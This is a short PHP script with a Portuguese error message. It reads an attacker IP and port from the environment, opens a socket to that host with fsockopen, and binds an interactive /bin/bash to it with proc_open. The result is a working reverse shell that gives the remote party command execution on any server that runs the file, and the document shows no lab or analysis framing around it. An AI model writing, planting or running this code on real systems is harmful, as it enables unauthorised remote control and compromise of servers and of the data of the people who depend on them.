<?php
$ip = getenv("ATTACKER_IP");
$port = getenv("ATTACKER_PORT") ?: 4444;

if (!$ip) {
    die("ATTACKER_IP não definido\n");
}

$sock = fsockopen($ip, (int)$port);

$proc = proc_open("/bin/bash -i", [
    0 => $sock,
    1 => $sock,
    2 => $sock
], $pipes);
?>
